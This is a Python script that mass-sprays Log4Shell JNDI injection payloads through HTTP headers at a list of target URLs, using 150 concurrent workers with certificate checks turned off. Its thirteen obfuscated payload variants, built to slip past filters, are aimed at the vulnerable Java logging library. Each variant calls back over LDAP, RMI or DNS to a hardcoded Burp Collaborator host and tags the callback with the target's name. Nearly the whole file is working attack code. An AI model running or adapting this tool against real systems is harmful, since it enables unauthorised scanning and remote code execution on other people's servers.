import requests as without_encode
import needle
import sys
import json
import urllib.parse
import random,string
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
#needle.LOGGER = 0

SERVER = "y76zcg4dlytcgrgsjgfnbc03lurkf9.burpcollaborator.net"
payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s.%s.%s.%s/%s}",
                       "${${::-j}ndi:rmi://%s.%s.%s.%s/%s}",
                       "${jndi:rmi://%s.%s.%s.%s/%s}",
                       "${${lower:jndi}:${lower:rmi}://%s.%s.%s.%s/%s}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://%s.%s.%s.%s/%s}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s.%s.%s/%s}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://%s.%s.%s.%s/%s}",
                       "${jndi:dns://%s.%s.%s.%s/%s}",
                       "${jndi:ldap://127.0.0.1#%s.%s.%s.%s/%s}",
                       "${jndi:ldap://127.0.0.1#%s.%s.%s.%s/%s}",
                       "${jndi:ldap://127.1.1.1#%s.%s.%s.%s/%s}",
                       "${j${k8s:k5:-ND}${sd:k5:-${123%%25ff:-${123%%25ff:-${upper:ı}:}}}ldap://%s.%s.%s.%s/%s",
                       "${jndi${nagli:-:}ldap:${::-/}/%s.%s.%s.%s/%s}}"]
def rand():
   return ''.join(random.choices(string.ascii_uppercase + string.digits, k = 5))

def generate_header(payload,number,server,rand,target):
    headers = {}
    with open("headers.txt", "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "":
                continue
            headers.update({i: payload % (i,number,target,server,rand)})
    return {k: str(v).encode("utf-8") for k,v in headers.items()}

def start(url):
    host = url.split("/")[2]
    for p in range(len(payloads)):
        headers = generate_header(payloads[p],p,SERVER,rand(),host)
        requests.get(url,verify=False,headers=headers,timeout=10)
    print("[•] Payloads sent to %s" % url)

def main():
    targets = []
    with open(sys.argv[1]) as file:
        for url in file.readlines():
            url = url.strip().replace('\n','')
            targets.append((url,))
    for i in needle.GroupWorkers(target=start, arguments=targets, concurrent=150):
       pass

if __name__ == '__main__':
    main()
